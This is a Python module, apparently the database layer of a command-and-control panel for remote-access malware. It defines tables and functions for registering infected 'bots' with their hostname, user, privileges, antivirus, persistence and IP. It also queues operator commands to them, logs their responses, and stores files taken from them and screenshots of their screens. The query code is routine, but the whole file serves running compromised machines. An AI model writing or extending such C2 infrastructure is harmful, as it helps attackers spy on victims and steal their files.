"""Database storage layer with schema migrations and connection pooling."""

import asyncio
import hashlib
import json
import logging
import sqlite3
import time
import uuid
from pathlib import Path

import aiosqlite

logger = logging.getLogger(__name__)

DB_PATH = Path(__file__).parent.parent.parent / "panel.db"
DATA_DIR = Path(__file__).parent.parent.parent / "data"
CURRENT_SCHEMA_VERSION = 2

_db_lock = asyncio.Lock()
_db_conn: aiosqlite.Connection | None = None


async def get_db() -> aiosqlite.Connection:
    """Get or create the database connection."""
    global _db_conn
    if _db_conn is None:
        _db_conn = await aiosqlite.connect(DB_PATH)
        _db_conn.row_factory = sqlite3.Row
        await _db_conn.execute("PRAGMA journal_mode=WAL")
        await _db_conn.execute("PRAGMA foreign_keys=ON")
        await _db_conn.execute("PRAGMA synchronous=NORMAL")
    return _db_conn


async def close_db():
    """Close the database connection."""
    global _db_conn
    if _db_conn:
        await _db_conn.close()
        _db_conn = None


MIGRATIONS = {
    1: {
        "description": "Initial schema with operators, sessions, enhanced bots/commands",
        "up": [
            # Schema version tracking
            """CREATE TABLE IF NOT EXISTS schema_version (
                version INTEGER PRIMARY KEY,
                applied_at INTEGER NOT NULL,
                description TEXT
            )""",
            # Operators table
            """CREATE TABLE IF NOT EXISTS operators (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                created_at INTEGER NOT NULL,
                last_login INTEGER,
                is_active INTEGER DEFAULT 1
            )""",
            # Sessions table
            """CREATE TABLE IF NOT EXISTS sessions (
                token TEXT PRIMARY KEY,
                operator_id TEXT NOT NULL,
                created_at INTEGER NOT NULL,
                expires_at INTEGER NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (operator_id) REFERENCES operators(id) ON DELETE CASCADE
            )""",
            "CREATE INDEX IF NOT EXISTS idx_sessions_operator_id ON sessions(operator_id)",
            "CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at)",
            # Bots table (enhanced)
            """CREATE TABLE IF NOT EXISTS bots (
                hwid TEXT PRIMARY KEY,
                hostname TEXT,
                os TEXT,
                arch TEXT,
                username TEXT,
                privileges TEXT,
                av TEXT,
                exe_path TEXT,
                version TEXT,
                first_seen INTEGER,
                last_seen INTEGER,
                is_connected INTEGER DEFAULT 0,
                last_heartbeat INTEGER,
                client_ip TEXT,
                persistence TEXT
            )""",
            "CREATE INDEX IF NOT EXISTS idx_bots_is_connected ON bots(is_connected)",
            "CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen DESC)",
            # Commands table (enhanced)
            """CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_type TEXT NOT NULL,
                args TEXT,
                status TEXT DEFAULT 'pending',
                created_at INTEGER NOT NULL,
                dispatched_at INTEGER,
                completed_at INTEGER,
                operator_id TEXT,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (operator_id) REFERENCES operators(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_commands_bot_hwid ON commands(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)",
            "CREATE INDEX IF NOT EXISTS idx_commands_created_at ON commands(created_at DESC)",
            # Responses table
            """CREATE TABLE IF NOT EXISTS responses (
                id TEXT PRIMARY KEY,
                command_id TEXT NOT NULL,
                status TEXT NOT NULL,
                data TEXT,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (command_id) REFERENCES commands(id) ON DELETE CASCADE
            )""",
            "CREATE INDEX IF NOT EXISTS idx_responses_command_id ON responses(command_id)",
        ],
    },
    2: {
        "description": "Add downloads and screenshots tables",
        "up": [
            # Downloads table
            """CREATE TABLE IF NOT EXISTS downloads (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_id TEXT,
                remote_path TEXT,
                local_path TEXT NOT NULL,
                filename TEXT NOT NULL,
                size INTEGER NOT NULL,
                sha256 TEXT NOT NULL,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_downloads_bot_hwid ON downloads(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_downloads_received_at ON downloads(received_at DESC)",
            # Screenshots table
            """CREATE TABLE IF NOT EXISTS screenshots (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_id TEXT,
                local_path TEXT NOT NULL,
                thumbnail_path TEXT,
                format TEXT DEFAULT 'png',
                size INTEGER NOT NULL,
                width INTEGER,
                height INTEGER,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_screenshots_bot_hwid ON screenshots(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_screenshots_received_at ON screenshots(received_at DESC)",
        ],
    },
}


async def get_schema_version() -> int:
    """Get current schema version, 0 if not initialized."""
    db = await get_db()
    try:
        async with db.execute("SELECT MAX(version) FROM schema_version") as cursor:
            row = await cursor.fetchone()
            return row[0] if row and row[0] else 0
    except aiosqlite.OperationalError:
        return 0


async def run_migrations():
    """Run all pending migrations."""
    db = await get_db()
    current = await get_schema_version()

    for version in range(current + 1, CURRENT_SCHEMA_VERSION + 1):
        if version not in MIGRATIONS:
            continue
        migration = MIGRATIONS[version]
        logger.info(f"Applying migration {version}: {migration['description']}")
        for sql in migration["up"]:
            await db.execute(sql)
        await db.execute(
            "INSERT INTO schema_version (version, applied_at, description) VALUES (?, ?, ?)",
            (version, int(time.time()), migration["description"]),
        )
        await db.commit()
        logger.info(f"Migration {version} applied successfully")


async def init_db():
    """Initialize database with migrations."""
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    (DATA_DIR / "downloads").mkdir(exist_ok=True)
    (DATA_DIR / "screenshots").mkdir(exist_ok=True)
    await run_migrations()


# =============================================================================
# Operator functions
# =============================================================================


async def create_operator(username: str, password_hash: str) -> str:
    """Create a new operator and return the ID."""
    db = await get_db()
    op_id = str(uuid.uuid4())
    async with _db_lock:
        await db.execute(
            "INSERT INTO operators (id, username, password_hash, created_at) VALUES (?, ?, ?, ?)",
            (op_id, username, password_hash, int(time.time())),
        )
        await db.commit()
    return op_id


async def get_operator_by_username(username: str) -> dict | None:
    """Get operator by username."""
    db = await get_db()
    async with db.execute(
        "SELECT * FROM operators WHERE username = ? AND is_active = 1", (username,)
    ) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def update_operator_login(operator_id: str):
    """Update last login timestamp."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE operators SET last_login = ? WHERE id = ?",
            (int(time.time()), operator_id),
        )
        await db.commit()


# =============================================================================
# Session functions
# =============================================================================


async def create_session(
    token: str, operator_id: str, expires_at: int, ip_address: str = None, user_agent: str = None
) -> None:
    """Create a new session."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO sessions (token, operator_id, created_at, expires_at, ip_address, user_agent) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            (token, operator_id, int(time.time()), expires_at, ip_address, user_agent),
        )
        await db.commit()


async def get_session(token: str) -> dict | None:
    """Get session by token, including operator info."""
    db = await get_db()
    async with db.execute(
        """SELECT s.*, o.username FROM sessions s
           JOIN operators o ON s.operator_id = o.id
           WHERE s.token = ? AND s.expires_at > ?""",
        (token, int(time.time())),
    ) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def delete_session(token: str):
    """Delete a session."""
    db = await get_db()
    async with _db_lock:
        await db.execute("DELETE FROM sessions WHERE token = ?", (token,))
        await db.commit()


async def cleanup_expired_sessions():
    """Delete expired sessions."""
    db = await get_db()
    async with _db_lock:
        await db.execute("DELETE FROM sessions WHERE expires_at < ?", (int(time.time()),))
        await db.commit()


# =============================================================================
# Bot functions
# =============================================================================


async def upsert_bot(info: dict, client_ip: str = None):
    """Insert or update a bot from checkin data."""
    now = int(time.time())
    db = await get_db()
    persistence = json.dumps(info.get("persistence", []))
    async with _db_lock:
        await db.execute(
            """INSERT INTO bots (hwid, hostname, os, arch, username, privileges, av,
                exe_path, version, first_seen, last_seen, is_connected, last_heartbeat, client_ip, persistence)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
            ON CONFLICT(hwid) DO UPDATE SET
                hostname=excluded.hostname, os=excluded.os, arch=excluded.arch,
                username=excluded.username, privileges=excluded.privileges,
                av=excluded.av, exe_path=excluded.exe_path, version=excluded.version,
                last_seen=excluded.last_seen, is_connected=1, last_heartbeat=excluded.last_heartbeat,
                client_ip=excluded.client_ip, persistence=excluded.persistence""",
            (
                info["hwid"],
                info["hostname"],
                info["os"],
                info["arch"],
                info["username"],
                info["privileges"],
                json.dumps(info.get("av", [])),
                info.get("exe_path", ""),
                info.get("version", ""),
                now,
                now,
                now,
                client_ip,
                persistence,
            ),
        )
        await db.commit()


async def update_bot_heartbeat(hwid: str):
    """Update bot heartbeat timestamp."""
    now = int(time.time())
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE bots SET last_heartbeat = ?, last_seen = ? WHERE hwid = ?",
            (now, now, hwid),
        )
        await db.commit()


async def set_bot_disconnected(hwid: str):
    """Mark bot as disconnected."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE bots SET is_connected = 0, last_seen = ? WHERE hwid = ?",
            (int(time.time()), hwid),
        )
        await db.commit()


async def get_bot(hwid: str) -> dict | None:
    """Get a single bot by HWID."""
    db = await get_db()
    async with db.execute("SELECT * FROM bots WHERE hwid = ?", (hwid,)) as cursor:
        row = await cursor.fetchone()
        if row:
            bot = dict(row)
            bot["av"] = json.loads(bot["av"]) if bot["av"] else []
            bot["persistence"] = json.loads(bot["persistence"]) if bot["persistence"] else []
            return bot
        return None


async def list_bots() -> list[dict]:
    """List all bots ordered by last seen."""
    db = await get_db()
    async with db.execute("SELECT * FROM bots ORDER BY last_seen DESC") as cursor:
        bots = []
        async for row in cursor:
            bot = dict(row)
            bot["av"] = json.loads(bot["av"]) if bot["av"] else []
            bot["persistence"] = json.loads(bot["persistence"]) if bot["persistence"] else []
            bots.append(bot)
        return bots


# =============================================================================
# Command functions
# =============================================================================


async def save_command(
    cmd_id: str,
    bot_hwid: str,
    command_type: str,
    args: str,
    operator_id: str = None,
    status: str = "pending",
) -> None:
    """Save a new command."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO commands (id, bot_hwid, command_type, args, status, created_at, operator_id) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (cmd_id, bot_hwid, command_type, args, status, int(time.time()), operator_id),
        )
        await db.commit()


async def get_command(cmd_id: str) -> dict | None:
    """Get a command by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM commands WHERE id = ?", (cmd_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def get_pending_commands(bot_hwid: str) -> list[dict]:
    """Get pending commands for a bot."""
    db = await get_db()
    async with db.execute(
        "SELECT * FROM commands WHERE bot_hwid = ? AND status = 'pending' ORDER BY created_at",
        (bot_hwid,),
    ) as cursor:
        return [dict(row) async for row in cursor]


async def mark_command_dispatched(cmd_id: str):
    """Mark a command as dispatched."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE commands SET status = 'dispatched', dispatched_at = ? WHERE id = ?",
            (int(time.time()), cmd_id),
        )
        await db.commit()


async def mark_command_completed(cmd_id: str, success: bool = True):
    """Mark a command as completed or failed."""
    db = await get_db()
    status = "completed" if success else "failed"
    async with _db_lock:
        await db.execute(
            "UPDATE commands SET status = ?, completed_at = ? WHERE id = ?",
            (status, int(time.time()), cmd_id),
        )
        await db.commit()


async def list_commands(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List commands, optionally filtered by bot."""
    db = await get_db()
    if bot_hwid:
        query = "SELECT * FROM commands WHERE bot_hwid = ? ORDER BY created_at DESC LIMIT ?"
        params = (bot_hwid, limit)
    else:
        query = "SELECT * FROM commands ORDER BY created_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def list_commands_with_responses(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List commands with their responses joined."""
    db = await get_db()
    if bot_hwid:
        query = """
            SELECT c.*, r.status as response_status, r.data as response_data, r.received_at as response_received_at
            FROM commands c
            LEFT JOIN responses r ON r.command_id = c.id
            WHERE c.bot_hwid = ?
            ORDER BY c.created_at DESC LIMIT ?
        """
        params = (bot_hwid, limit)
    else:
        query = """
            SELECT c.*, r.status as response_status, r.data as response_data, r.received_at as response_received_at
            FROM commands c
            LEFT JOIN responses r ON r.command_id = c.id
            ORDER BY c.created_at DESC LIMIT ?
        """
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


# =============================================================================
# Response functions
# =============================================================================


async def save_response(resp_id: str, command_id: str, status: str, data: str):
    """Save a command response."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO responses (id, command_id, status, data, received_at) VALUES (?, ?, ?, ?, ?)",
            (resp_id, command_id, status, data, int(time.time())),
        )
        await db.commit()


# =============================================================================
# Download functions
# =============================================================================


async def save_download(
    download_id: str,
    bot_hwid: str,
    command_id: str,
    remote_path: str,
    local_path: str,
    filename: str,
    size: int,
    sha256: str,
) -> None:
    """Save a download record."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            """INSERT INTO downloads (id, bot_hwid, command_id, remote_path, local_path, filename, size, sha256, received_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (download_id, bot_hwid, command_id, remote_path, local_path, filename, size, sha256, int(time.time())),
        )
        await db.commit()


async def list_downloads(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List downloads, optionally filtered by bot."""
    db = await get_db()
    if bot_hwid:
        query = "SELECT * FROM downloads WHERE bot_hwid = ? ORDER BY received_at DESC LIMIT ?"
        params = (bot_hwid, limit)
    else:
        query = "SELECT * FROM downloads ORDER BY received_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def get_download(download_id: str) -> dict | None:
    """Get a download by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM downloads WHERE id = ?", (download_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


# =============================================================================
# Screenshot functions
# =============================================================================


async def save_screenshot(
    screenshot_id: str,
    bot_hwid: str,
    command_id: str,
    local_path: str,
    thumbnail_path: str,
    fmt: str,
    size: int,
    width: int = None,
    height: int = None,
) -> None:
    """Save a screenshot record."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            """INSERT INTO screenshots (id, bot_hwid, command_id, local_path, thumbnail_path, format, size, width, height, received_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (screenshot_id, bot_hwid, command_id, local_path, thumbnail_path, fmt, size, width, height, int(time.time())),
        )
        await db.commit()


async def list_screenshots(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List screenshots, optionally filtered by bot."""
    db = await get_db()
    if bot_hwid:
        query = "SELECT * FROM screenshots WHERE bot_hwid = ? ORDER BY received_at DESC LIMIT ?"
        params = (bot_hwid, limit)
    else:
        query = "SELECT * FROM screenshots ORDER BY received_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def get_screenshot(screenshot_id: str) -> dict | None:
    """Get a screenshot by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM screenshots WHERE id = ?", (screenshot_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None
